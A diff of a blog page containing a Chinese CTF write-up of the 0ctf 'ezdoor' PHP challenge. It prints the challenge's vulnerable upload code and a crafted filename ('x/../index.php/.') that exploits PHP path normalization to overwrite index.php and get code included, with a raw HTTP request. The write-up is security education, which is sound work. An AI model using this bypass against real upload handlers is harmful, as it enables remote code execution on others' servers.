@@ -261,7 +261,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,413</span> / Reading time: <span class="post-count">7 min</span></span>
+                        <span>Word count: <span class="post-count">1,251</span> / Reading time: <span class="post-count">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -398,53 +398,46 @@ height:50vh;
 <li>创建容器<code>docker run -dit -p 8585:80 --name 0ctf-ezdoor 0ctf-ezdoor</code> </li>
 </ol>
 <h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$dir = &apos;sandbox/&apos; . sha1($_SERVER[&apos;REMOTE_ADDR&apos;]) . &apos;/&apos;;</span><br><span class="line">if(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">if(!file_exists($dir . &quot;index.php&quot;))&#123;</span><br><span class="line">  touch($dir . &quot;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function clear($dir)</span><br><span class="line">&#123;</span><br><span class="line">  if(!is_dir($dir))&#123;</span><br><span class="line">    unlink($dir);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  foreach (scandir($dir) as $file) &#123;</span><br><span class="line">    if (in_array($file, [&quot;.&quot;, &quot;..&quot;])) &#123;</span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($dir . $file);</span><br><span class="line">  &#125;</span><br><span class="line">  rmdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">switch ($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;</span><br><span class="line">  case &apos;pwd&apos;:</span><br><span class="line">    echo $dir;</span><br><span class="line">    break;</span><br><span class="line">  case &apos;phpinfo&apos;:</span><br><span class="line">    echo file_get_contents(&quot;phpinfo.txt&quot;);</span><br><span class="line">    break;</span><br><span class="line">  case &apos;reset&apos;:</span><br><span class="line">    clear($dir);</span><br><span class="line">    break;</span><br><span class="line">  case &apos;time&apos;:</span><br><span class="line">    echo time();</span><br><span class="line">    break;</span><br><span class="line">  case &apos;upload&apos;:</span><br><span class="line">    if (!isset($_GET[&quot;name&quot;]) || !isset($_FILES[&apos;file&apos;])) &#123;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($_FILES[&apos;file&apos;][&apos;size&apos;] &gt; 100000) &#123;</span><br><span class="line">      clear($dir);</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = $dir . $_GET[&quot;name&quot;];</span><br><span class="line">    if (preg_match(&quot;/[^a-zA-Z0-9.\/]/&quot;, $name) ||</span><br><span class="line">      stristr(pathinfo($name)[&quot;extension&quot;], &quot;h&quot;)) &#123;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $name);</span><br><span class="line">    $size = 0;</span><br><span class="line">    foreach (scandir($dir) as $file) &#123;</span><br><span class="line">      if (in_array($file, [&quot;.&quot;, &quot;..&quot;])) &#123;</span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br><span class="line">      $size += filesize($dir . $file);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($size &gt; 100000) &#123;</span><br><span class="line">      clear($dir);</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br><span class="line">  case &apos;shell&apos;:</span><br><span class="line">    ini_set(&quot;open_basedir&quot;, &quot;/var/www/html/$dir:/var/www/html/flag&quot;);</span><br><span class="line">    include $dir . &quot;index.php&quot;;</span><br><span class="line">    break;</span><br><span class="line">  default:</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">首先理解代码的意思</span><br><span class="line">首先会根据ip创建一个文件夹，然后创建一个index.php</span><br><span class="line">然后是一些功能函数的定义</span><br><span class="line">然后switch是一些功能</span><br></pre></td></tr></table></figure>
-<p>switch ($_GET[“action”] ?? “”) {<br>  case ‘pwd’:<br>    echo $dir;<br>    break;<br>  case ‘phpinfo’:<br>    echo file_get_contents(“phpinfo.txt”);<br>    break;<br>  case ‘reset’:<br>    clear($dir);<br>    break;<br>  case ‘time’:<br>    echo time();<br>    break;<br>  case ‘upload’:<br>    if (!isset($_GET[“name”]) || !isset($_FILES[‘file’])) {</p>
-<pre><code>...
-
-  break;
-</code></pre><p>  case ‘shell’:<br>    ini_set(“open_basedir”, “/var/www/html/$dir:/var/www/html/flag”);<br>    include $dir . “index.php”;<br>    break;<br>  default:<br>    highlight_file(<strong>FILE</strong>);<br>    break;<br>    }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">功能</span><br><span class="line"></span><br><span class="line">- 查看工作目录</span><br><span class="line">- 查看phpinfo</span><br><span class="line">- 重置</span><br><span class="line">- 打印时间</span><br><span class="line">- 上传</span><br><span class="line">- 将之前创建的index.php包含进来</span><br><span class="line"></span><br><span class="line">upload功能</span><br></pre></td></tr></table></figure></p>
-<p> case ‘upload’:<br>    if (!isset($_GET[“name”]) || !isset($_FILES[‘file’])) {<br>      break;<br>    }</p>
-<pre><code>if ($_FILES[&apos;file&apos;][&apos;size&apos;] &gt; 100000) {
-  clear($dir);
-  break;
-}
-
-$name = $dir . $_GET[&quot;name&quot;];
-if (preg_match(&quot;/[^a-zA-Z0-9.\/]/&quot;, $name) ||
-  stristr(pathinfo($name)[&quot;extension&quot;], &quot;h&quot;)) {
-  break;
-}
-move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $name);
-$size = 0;
-foreach (scandir($dir) as $file) {
-  if (in_array($file, [&quot;.&quot;, &quot;..&quot;])) {
-    continue;
-  }
-  $size += filesize($dir . $file);
-}
-if ($size &gt; 100000) {
-  clear($dir);
-}
-break;
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">检测文件名</span><br></pre></td></tr></table></figure>
-<pre><code>$name = $dir . $_GET[&quot;name&quot;];
-if (preg_match(&quot;/[^a-zA-Z0-9.\/]/&quot;, $name) ||
-  stristr(pathinfo($name)[&quot;extension&quot;], &quot;h&quot;)) {
-  break;
-}
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">文件名字母数字开头，后缀里不能有h</span><br><span class="line">也就是`php|php3|php5`等无法使用</span><br><span class="line">然后移动文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">于是思路</span><br><span class="line"></span><br><span class="line">- 上传index.php覆盖掉原来的index.php</span><br><span class="line">- 利用shell功能进行文件包含</span><br><span class="line"></span><br><span class="line">## 非预期解</span><br><span class="line">这里主要学习非预期。预期参考</span><br><span class="line">https://skysec.top/2018/04/11/0ctf-ezdoor/#%E9%A2%84%E6%9C%9F%E8%A7%A3</span><br><span class="line"></span><br><span class="line">构造上传表单</span><br></pre></td></tr></table></figure>
-<p><form action="http://52.36.15.23:8585/?action=upload&name=hu3sky/../index.php/." method="post" enctype="multipart/form-data"><br>    <input type="file" name="file"><br>    <input type="submit"><br></form><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">请求</span><br></pre></td></tr></table></figure></p>
-<p>POST /?action=upload&amp;name=hu3sky/../index.php/. HTTP/1.1<br>Host: 52.36.15.23:8585<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://52.36.15.23:8881/upload.php" target="_blank" rel="noopener">http://52.36.15.23:8881/upload.php</a><br>Content-Type: multipart/form-data; boundary=—————————292502680226301<br>Content-Length: 633<br>Connection: close<br>Upgrade-Insecure-Requests: 1</p>
-<p>—————————–292502680226301<br>Content-Disposition: form-data; name=”file”; filename=”shell.php”<br>Content-Type: text/plain</p>
-<p>&lt;?php echo aaa; ?&gt;</p>
-<p>—————————–292502680226301–</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![1](/0ctf/1.png)</span><br><span class="line"></span><br><span class="line">成功覆盖</span><br><span class="line"></span><br><span class="line">## 漏洞分析</span><br><span class="line">### 为什么上传index.php/. 能绕过</span><br><span class="line">在函数`file_get_contents` 和函数`move_upload_file`的底层都会调用`tsrm_realpath`函数来处理相关文件</span><br></pre></td></tr></table></figure>
-<p>i = len;<br>// i的初始值为字符串的长度<br> while (i &gt; start &amp;&amp; !IS_SLASH(path[i-1])) {<br>     i–;<br>   // 把i定位到第一个/的后面<br> }<br> if (i == len ||<br>     (i == len - 1 &amp;&amp; path[i] == ‘.’)) {<br>     len = i - 1;<br>    //  删除路径中最后的 /. , 也就是 /path/test.php/. 会变为 /path/test.php<br>     is_dir = 1;<br>     continue;<br> } else if (i == len - 2 &amp;&amp; path[i] == ‘.’ &amp;&amp; path[i+1] == ‘.’) {<br>     //删除路径结尾的 /..<br>     is_dir = 1;<br>     if (link_is_dir) {<br>         *link_is_dir = 1;<br>     }<br>     if (i - 1 &lt;= start) {<br>         return start ? start : len;<br>     }<br>     j = tsrm_realpath_r(path, start, i-1, ll, t, use_realpath, 1, NULL TSRMLS_CC);<br>    // 进行递归调用的时候，这里把strlen设置为了i-1，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这个函数会自动递归的去除文件末尾的`/.` 我们上传的`index.php/.` 会变成`index.php`</span><br><span class="line"></span><br><span class="line">### 如何覆盖原文件</span><br><span class="line">当我们传入`index.php/.`虽然能够绕过检测，但是并不能覆盖原来的`index.php`文件，也就是说我们能上传其他php文件，但是shell函数只会包含`index.php` ，所以最终目的还是要我们能够覆盖掉`index.php`文件</span><br><span class="line"></span><br><span class="line">zsx师傅：</span><br><span class="line"></span><br><span class="line">![1](/0ctf/2.png)</span><br></pre></td></tr></table></figure>
-<p>f (VCWD_RENAME(path, new_path) == 0) {<br>        successful = 1;<br>    } else if (php_copy_file_ex(path, new_path, STREAM_DISABLE_OPEN_BASEDIR) == SUCCESS) {<br>        VCWD_UNLINK(path);<br>        successful = 1;<br>    }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">所以说我们覆盖失败的原因是我们的文件`index.php/.`经过`tsrm_realpath`函数去掉末尾`/.` 后为`index.php`该文件存在，`lstat`返回`0`，不会继续打开文件了</span><br><span class="line">但是当我们传入的文件是，`hu3sky/../index.php/.`时，先经过之前的`tsrm_realpath`函数处理后，文件变为`hu3sky/../index.php`  注意。这个位置并没有调用 `tsrm_realpath` 函数来处理文件名了。所以说此时检测的文件就是`hu3sky/../index.php`此时`lstat`返回值是`-1`. 认为不存在该文件，,于是就导致了文件的写入</span><br><span class="line"></span><br><span class="line">这里借用pupiles师傅的图</span><br></pre></td></tr></table></figure></p>
-<p>发送name=index.php/.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![1](/0ctf/3.png)</span><br></pre></td></tr></table></figure></p>
-<p>发送name=x/../index.php/.<br><code>`</code></p>
+<p>首先理解代码的意思<br>首先会根据ip创建一个文件夹，然后创建一个index.php<br>然后是一些功能函数的定义<br>然后switch是一些功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">switch ($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;</span><br><span class="line">  case &apos;pwd&apos;:</span><br><span class="line">    echo $dir;</span><br><span class="line">    break;</span><br><span class="line">  case &apos;phpinfo&apos;:</span><br><span class="line">    echo file_get_contents(&quot;phpinfo.txt&quot;);</span><br><span class="line">    break;</span><br><span class="line">  case &apos;reset&apos;:</span><br><span class="line">    clear($dir);</span><br><span class="line">    break;</span><br><span class="line">  case &apos;time&apos;:</span><br><span class="line">    echo time();</span><br><span class="line">    break;</span><br><span class="line">  case &apos;upload&apos;:</span><br><span class="line">    if (!isset($_GET[&quot;name&quot;]) || !isset($_FILES[&apos;file&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">      break;</span><br><span class="line">  case &apos;shell&apos;:</span><br><span class="line">    ini_set(&quot;open_basedir&quot;, &quot;/var/www/html/$dir:/var/www/html/flag&quot;);</span><br><span class="line">    include $dir . &quot;index.php&quot;;</span><br><span class="line">    break;</span><br><span class="line">  default:</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    break;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>功能</p>
+<ul>
+<li>查看工作目录</li>
+<li>查看phpinfo</li>
+<li>重置</li>
+<li>打印时间</li>
+<li>上传</li>
+<li>将之前创建的index.php包含进来</li>
+</ul>
+<p>upload功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> case &apos;upload&apos;:</span><br><span class="line">    if (!isset($_GET[&quot;name&quot;]) || !isset($_FILES[&apos;file&apos;])) &#123;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($_FILES[&apos;file&apos;][&apos;size&apos;] &gt; 100000) &#123;</span><br><span class="line">      clear($dir);</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = $dir . $_GET[&quot;name&quot;];</span><br><span class="line">    if (preg_match(&quot;/[^a-zA-Z0-9.\/]/&quot;, $name) ||</span><br><span class="line">      stristr(pathinfo($name)[&quot;extension&quot;], &quot;h&quot;)) &#123;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $name);</span><br><span class="line">    $size = 0;</span><br><span class="line">    foreach (scandir($dir) as $file) &#123;</span><br><span class="line">      if (in_array($file, [&quot;.&quot;, &quot;..&quot;])) &#123;</span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br><span class="line">      $size += filesize($dir . $file);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($size &gt; 100000) &#123;</span><br><span class="line">      clear($dir);</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br></pre></td></tr></table></figure>
+<p>检测文件名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    $name = $dir . $_GET[&quot;name&quot;];</span><br><span class="line">    if (preg_match(&quot;/[^a-zA-Z0-9.\/]/&quot;, $name) ||</span><br><span class="line">      stristr(pathinfo($name)[&quot;extension&quot;], &quot;h&quot;)) &#123;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>文件名字母数字开头，后缀里不能有h<br>也就是<code>php|php3|php5</code>等无法使用<br>然后移动文件</p>
+<p>于是思路</p>
+<ul>
+<li>上传index.php覆盖掉原来的index.php</li>
+<li>利用shell功能进行文件包含</li>
+</ul>
+<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>这里主要学习非预期。预期参考<br><a href="https://skysec.top/2018/04/11/0ctf-ezdoor/#%E9%A2%84%E6%9C%9F%E8%A7%A3" target="_blank" rel="noopener">https://skysec.top/2018/04/11/0ctf-ezdoor/#%E9%A2%84%E6%9C%9F%E8%A7%A3</a></p>
+<p>构造上传表单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://52.36.15.23:8585/?action=upload&amp;name=hu3sky/../index.php/.&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?action=upload&amp;name=hu3sky/../index.php/. HTTP/1.1</span><br><span class="line">Host: 52.36.15.23:8585</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://52.36.15.23:8881/upload.php</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------292502680226301</span><br><span class="line">Content-Length: 633</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------292502680226301</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php echo aaa; ?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------292502680226301--</span><br></pre></td></tr></table></figure>
+<p><img src="/0ctf/1.png" alt="1"></p>
+<p>成功覆盖</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="为什么上传index-php-能绕过"><a href="#为什么上传index-php-能绕过" class="headerlink" title="为什么上传index.php/. 能绕过"></a>为什么上传index.php/. 能绕过</h3><p>在函数<code>file_get_contents</code> 和函数<code>move_upload_file</code>的底层都会调用<code>tsrm_realpath</code>函数来处理相关文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i = len; </span><br><span class="line">// i的初始值为字符串的长度</span><br><span class="line"> while (i &gt; start &amp;&amp; !IS_SLASH(path[i-1])) &#123;</span><br><span class="line">     i--;  </span><br><span class="line">   // 把i定位到第一个/的后面</span><br><span class="line"> &#125;</span><br><span class="line"> if (i == len ||</span><br><span class="line">     (i == len - 1 &amp;&amp; path[i] == &apos;.&apos;)) &#123;</span><br><span class="line">     len = i - 1; </span><br><span class="line">    //  删除路径中最后的 /. , 也就是 /path/test.php/. 会变为 /path/test.php </span><br><span class="line">     is_dir = 1;</span><br><span class="line">     continue;</span><br><span class="line"> &#125; else if (i == len - 2 &amp;&amp; path[i] == &apos;.&apos; &amp;&amp; path[i+1] == &apos;.&apos;) &#123;</span><br><span class="line">     //删除路径结尾的 /..</span><br><span class="line">     is_dir = 1;</span><br><span class="line">     if (link_is_dir) &#123;</span><br><span class="line">         *link_is_dir = 1;</span><br><span class="line">     &#125;</span><br><span class="line">     if (i - 1 &lt;= start) &#123;</span><br><span class="line">         return start ? start : len;</span><br><span class="line">     &#125;</span><br><span class="line">     j = tsrm_realpath_r(path, start, i-1, ll, t, use_realpath, 1, NULL TSRMLS_CC);</span><br><span class="line">    // 进行递归调用的时候，这里把strlen设置为了i-1，</span><br></pre></td></tr></table></figure>
+<p>这个函数会自动递归的去除文件末尾的<code>/.</code> 我们上传的<code>index.php/.</code> 会变成<code>index.php</code></p>
+<h3 id="如何覆盖原文件"><a href="#如何覆盖原文件" class="headerlink" title="如何覆盖原文件"></a>如何覆盖原文件</h3><p>当我们传入<code>index.php/.</code>虽然能够绕过检测，但是并不能覆盖原来的<code>index.php</code>文件，也就是说我们能上传其他php文件，但是shell函数只会包含<code>index.php</code> ，所以最终目的还是要我们能够覆盖掉<code>index.php</code>文件</p>
+<p>zsx师傅：</p>
+<p><img src="/0ctf/2.png" alt="1"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f (VCWD_RENAME(path, new_path) == 0) &#123;</span><br><span class="line">        successful = 1;</span><br><span class="line">    &#125; else if (php_copy_file_ex(path, new_path, STREAM_DISABLE_OPEN_BASEDIR) == SUCCESS) &#123;</span><br><span class="line">        VCWD_UNLINK(path);</span><br><span class="line">        successful = 1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>所以说我们覆盖失败的原因是我们的文件<code>index.php/.</code>经过<code>tsrm_realpath</code>函数去掉末尾<code>/.</code> 后为<code>index.php</code>该文件存在，<code>lstat</code>返回<code>0</code>，不会继续打开文件了<br>但是当我们传入的文件是，<code>hu3sky/../index.php/.</code>时，先经过之前的<code>tsrm_realpath</code>函数处理后，文件变为<code>hu3sky/../index.php</code>  注意。这个位置并没有调用 <code>tsrm_realpath</code> 函数来处理文件名了。所以说此时检测的文件就是<code>hu3sky/../index.php</code>此时<code>lstat</code>返回值是<code>-1</code>. 认为不存在该文件，,于是就导致了文件的写入</p>
+<p>这里借用pupiles师傅的图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发送name=index.php/.</span><br></pre></td></tr></table></figure>
+<p><img src="/0ctf/3.png" alt="1"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发送name=x/../index.php/.</span><br></pre></td></tr></table></figure>
 <p><img src="/0ctf/4.png" alt="1"></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
 <li><a href="https://blog.zsxsoft.com/post/36" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/36</a></li>
@@ -601,7 +594,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0ctf-ezdoor"><span class="toc-number">1.</span> <span class="toc-text">0ctf-ezdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">1.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0ctf-ezdoor"><span class="toc-number">1.</span> <span class="toc-text">0ctf-ezdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#非预期解"><span class="toc-number">1.3.</span> <span class="toc-text">非预期解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#为什么上传index-php-能绕过"><span class="toc-number">1.4.1.</span> <span class="toc-text">为什么上传index.php/. 能绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何覆盖原文件"><span class="toc-number">1.4.2.</span> <span class="toc-text">如何覆盖原文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">1.5.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -614,186 +607,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
